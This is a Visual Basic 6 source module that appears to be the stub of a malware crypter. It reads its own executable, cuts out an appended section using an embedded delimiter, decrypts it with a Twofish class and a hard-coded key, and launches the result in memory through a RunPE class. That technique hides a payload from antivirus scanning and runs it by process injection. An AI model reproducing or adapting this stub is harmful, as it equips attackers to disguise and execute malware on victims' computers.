Attribute VB_Name = "mMain"
Option Explicit
Dim crypt As New clsTwofish
Dim RunPE As New clsRunPe

Sub Main()
'vars
Dim CryptKey As String
    CryptKey = "AZJ|ƒ…FLt⁄à(kˆ3Ö®{#ÓÈˇæ†øb’ó‹"
Dim SplitKey As String
    SplitKey = "ﬁ63xàîp€>˝πkuÕi|∏‰_ôb'ú¸˜êAãO`"
Dim sCut() As String
Dim sBuffer As String
Dim sThisExe As String
    sThisExe = App.Path & "\" & App.EXEName & ".exe"

'Start
Open sThisExe For Binary As #1
    sBuffer = Space(FileLen(sThisExe))
    Get #1, , sBuffer
Close #1

sCut() = Split(sBuffer, SplitKey)

sCut(1) = crypt.DecryptString(sCut(1), CryptKey, False)

RunPE.RunPE StrConv(sCut(1), vbFromUnicode), sThisExe
End Sub
